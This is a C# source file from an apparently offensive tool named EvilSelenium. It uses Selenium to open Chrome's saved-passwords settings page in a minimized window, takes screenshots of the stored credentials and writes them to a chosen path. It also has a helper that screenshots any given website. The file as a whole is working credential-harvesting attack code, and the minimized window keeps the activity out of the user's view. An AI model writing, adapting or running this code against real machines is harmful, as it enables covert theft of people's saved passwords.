using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using OpenQA.Selenium;
using System.Threading;
using EvilSelenium.Misc;

namespace EvilSelenium.Commands
{
    class ScreenshotChromePwds
    {
      
        /* Screenshots passwords in chrome://settings/passwords and saves to specified path */
        public static void ScreenshotChromePasswords(string saveToPath)
        {
            // Validate path
            string outPath = Helpers.VerifyPath(saveToPath);

            IWebDriver driver = Helpers.InitDriver();
            driver.Manage().Window.Minimize();

            driver.Navigate().GoToUrl("chrome://settings/passwords");
            Thread.Sleep(2000); // Wait for page to load

            // Screenshot 1
            ITakesScreenshot screenshotDriver = driver as ITakesScreenshot;
            Screenshot screenshot = screenshotDriver.GetScreenshot();
            screenshot.SaveAsFile(outPath + @"\img.png");

            // Scroll down
            Thread.Sleep(2000);
            driver.FindElement(By.CssSelector("body")).Click();
            driver.FindElement(By.CssSelector("body")).SendKeys(Keys.Control + Keys.End);
            Thread.Sleep(2000);

            // Screenshot 2
            ITakesScreenshot screenshotDriver2 = driver as ITakesScreenshot;
            Screenshot screenshot2 = screenshotDriver2.GetScreenshot();
            screenshot2.SaveAsFile(outPath + @"\img2.png");

            driver.Quit();

        }


        public static void ScreenShotWebsite(string website, string saveToPath)
        {
            // Validate path
            string outPath = Helpers.VerifyPath(saveToPath);

            IWebDriver driver = Helpers.InitDriver();
            driver.Manage().Window.Minimize();

            driver.Navigate().GoToUrl(website);
            Thread.Sleep(3000); // Wait for page to load

            // Screenshot 1
            ITakesScreenshot screenshotDriver = driver as ITakesScreenshot;
            Screenshot screenshot = screenshotDriver.GetScreenshot();
            screenshot.SaveAsFile(outPath + @"\img.png");

            driver.Quit();

        }
    }
}
